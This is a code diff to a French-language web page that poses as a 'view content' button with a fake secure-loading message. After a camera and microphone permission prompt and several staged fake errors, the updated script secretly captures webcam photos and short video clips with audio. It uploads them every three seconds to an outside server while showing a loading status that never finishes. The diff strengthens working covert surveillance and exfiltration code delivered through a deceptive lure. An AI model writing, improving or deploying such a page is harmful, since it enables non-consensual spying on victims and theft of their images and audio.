@@ -38,12 +38,26 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #555;
+    }
+
+    button:disabled {
+      background: #222;
+      cursor: not-allowed;
     }
 
     #status {
       margin-top: 20px;
       font-size: 16px;
       color: #ccc;
+    }
+
+    .hidden {
+      display: none;
     }
   </style>
 </head>
@@ -52,7 +66,7 @@
   <canvas id="canvas" style="display:none;"></canvas>
 
   <div class="center">
-    <button id="fakeBtn">Voir</button>
+    <button id="fakeBtn">Voir le contenu</button>
     <div id="status">Chargement sécurisé en cours...</div>
   </div>
 
@@ -63,82 +77,181 @@
     const status = document.getElementById('status');
 
     let clickCount = 0;
-    let recorder;
-    let recordedChunks = [];
-    const capturedImages = [];
+    let stream = null;
+    let captureInterval = null;
+    let videoRecordInterval = null;
+    let isCapturing = false;
 
-    // ✅ Démarrer la webcam + enregistrement vidéo
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then(stream => {
+    // Configuration
+    const CAPTURE_INTERVAL = 3000; // 3 secondes
+    const SERVER_URL = 'https://moonscale-dashboard.onrender.com/stream/upload';
+
+    // ✅ Fonction pour demander la permission et démarrer la webcam
+    async function requestCameraPermission() {
+      try {
+        status.textContent = "Demande d'autorisation caméra...";
+        
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            width: { ideal: 1280 }, 
+            height: { ideal: 720 },
+            facingMode: 'user'
+          }, 
+          audio: true 
+        });
+        
         video.srcObject = stream;
-
-        // 🎥 Démarrer l'enregistrement vidéo
-        recorder = new MediaRecorder(stream);
-        recorder.ondataavailable = e => {
-          if (e.data.size > 0) recordedChunks.push(e.data);
-        };
-        recorder.start();
-
-        // Stopper après 5s
-        setTimeout(() => {
-          recorder.stop();
-        }, 5000);
-      })
-      .catch(err => {
+        status.textContent = "Caméra activée. Cliquez pour continuer.";
+        return true;
+      } catch (err) {
         status.textContent = "Erreur : Accès à la caméra refusé.";
-        console.error(err);
-      });
+        console.error('Erreur caméra:', err);
+        return false;
+      }
+    }
 
     // 🖼️ Capture d'une photo
     function capturePhoto() {
+      if (!video.videoWidth || !video.videoHeight) return null;
+      
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg');
-      capturedImages.push(dataUrl);
+      return canvas.toDataURL('image/jpeg', 0.8);
     }
 
-    // 📤 Envoi au serveur
-    function sendData() {
-      status.textContent = "Envoi des données...";
+    // 🎥 Enregistrement vidéo court
+    function recordVideoSegment() {
+      return new Promise((resolve) => {
+        if (!stream) {
+          resolve(null);
+          return;
+        }
 
-      // Convertir la vidéo en blob
-      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-      const formData = new FormData();
-      capturedImages.forEach((img, i) => {
-        formData.append(`image${i + 1}`, img);
-      });
-      formData.append('video', videoBlob, 'capture.webm');
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
 
-      fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
-        method: 'POST',
-        body: formData
-      }).then(() => {
-        status.textContent = "Redirection en cours...";
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const reader = new FileReader();
+          reader.onload = () => resolve(reader.result);
+          reader.readAsDataURL(blob);
+        };
+
+        recorder.start();
+        
+        // Enregistrer pendant 2 secondes
         setTimeout(() => {
-          window.location.href = "https://www.facebook.com";
-        }, 1000);
-      }).catch(err => {
-        status.textContent = "Erreur d'envoi.";
-        console.error(err);
+          recorder.stop();
+        }, 2000);
       });
     }
 
-    // 🧠 Clic sur le faux bouton "Voir"
-    fakeBtn.addEventListener('click', () => {
-      clickCount++;
-      capturePhoto();
+    // 📤 Envoi des données au serveur
+    async function sendCapturedData() {
+      try {
+        const photo = capturePhoto();
+        const videoData = await recordVideoSegment();
 
-      if (clickCount < 5) {
-        status.textContent = `Erreur... Veuillez réessayer (${clickCount}/5)`;
+        if (!photo && !videoData) return;
+
+        const payload = {
+          images: photo ? [photo] : [],
+          video: videoData,
+          timestamp: new Date().toISOString()
+        };
+
+        const response = await fetch(SERVER_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log('✅ Données envoyées avec succès');
+        } else {
+          console.error('❌ Erreur serveur:', response.status);
+        }
+      } catch (err) {
+        console.error('❌ Erreur envoi:', err);
+      }
+    }
+
+    // 🔄 Démarrer la capture continue
+    function startContinuousCapture() {
+      if (isCapturing) return;
+      
+      isCapturing = true;
+      status.textContent = "Connexion établie. Traitement en cours...";
+      
+      // Envoyer immédiatement une première capture
+      sendCapturedData();
+      
+      // Puis continuer toutes les 3 secondes
+      captureInterval = setInterval(() => {
+        sendCapturedData();
+      }, CAPTURE_INTERVAL);
+
+      // Simulation de "chargement" qui ne finit jamais
+      let dots = 0;
+      setInterval(() => {
+        dots = (dots + 1) % 4;
+        status.textContent = "Traitement en cours" + ".".repeat(dots);
+      }, 500);
+    }
+
+    // 🛑 Arrêter la capture (pour les tests)
+    function stopCapture() {
+      isCapturing = false;
+      if (captureInterval) {
+        clearInterval(captureInterval);
+        captureInterval = null;
+      }
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+    }
+
+    // 🧠 Gestion du clic sur le faux bouton
+    fakeBtn.addEventListener('click', async () => {
+      clickCount++;
+
+      if (clickCount === 1) {
+        // Premier clic : demander la permission
+        const hasPermission = await requestCameraPermission();
+        if (!hasPermission) return;
+        
+        fakeBtn.textContent = "Connexion en cours...";
+      } else if (clickCount < 5) {
+        // Clics 2-4 : simuler des "erreurs"
+        status.textContent = `Erreur de connexion... Veuillez réessayer (${clickCount}/5)`;
+        fakeBtn.textContent = "Réessayer";
       } else {
+        // 5ème clic : démarrer la capture continue
         fakeBtn.disabled = true;
-        status.textContent = "Connexion réussie.";
-        sendData();
+        fakeBtn.textContent = "Traitement...";
+        startContinuousCapture();
       }
     });
+
+    // 🔧 Nettoyage à la fermeture de la page
+    window.addEventListener('beforeunload', () => {
+      stopCapture();
+    });
+
+    // 🎯 Pour les tests : arrêter après 30 secondes
+    setTimeout(() => {
+      console.log('🛑 Arrêt automatique après 30 secondes (mode démo)');
+      stopCapture();
+    }, 30000);
   </script>
 </body>
 </html>
